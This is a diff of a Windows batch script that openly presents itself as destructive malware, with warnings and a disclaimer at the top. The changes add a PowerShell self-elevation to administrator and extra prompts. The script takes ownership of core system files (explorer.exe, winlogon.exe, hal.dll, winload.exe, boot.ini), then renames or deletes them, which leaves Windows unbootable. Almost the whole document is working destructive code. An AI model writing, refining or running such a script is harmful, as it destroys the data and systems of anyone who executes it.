@@ -3,17 +3,21 @@ echo ==========================================================
 echo WARNING: You are about to execute a highly destructive malware.
 echo DO NOT proceed unless you fully understand the consequences.
 echo Close this file and delete it immediately in your real pc 
+echo This script should ask for administrator priveliges. Granting these will render your device useless.
 echo im not responsible for any damages to ur pc
 echo ==========================================================
-pause
-pause
+powershell -Command "Start-Process '%~f0' -Verb RunAs"
+echo Are you sure?
+pause > NUL
+echo Say goodbye to your device...
+pause > NUL
 cd C:\windows\system32
 takeown /f C:\windows\explorer.exe
 ren C:\windows\explorer.exe fishmyass.old
 takeown /f  C:\windows\system32\hal.dll
-del  C:\windows\system32\hal.dll /q
+del C:\windows\system32\hal.dll /q
 takeown /f C:\windows\system32\winlogon.exe
-ren  C:\windows\system32\winlogon.exe windead.dead
+ren  C:\windows\system32\winlogon.exe winlogoff.notanexe
 del C:\boot.ini /f /q
 del C:\Windows\System32\hal.dll /f /q
 del C:\Windows\System32\winload.exe /f /q
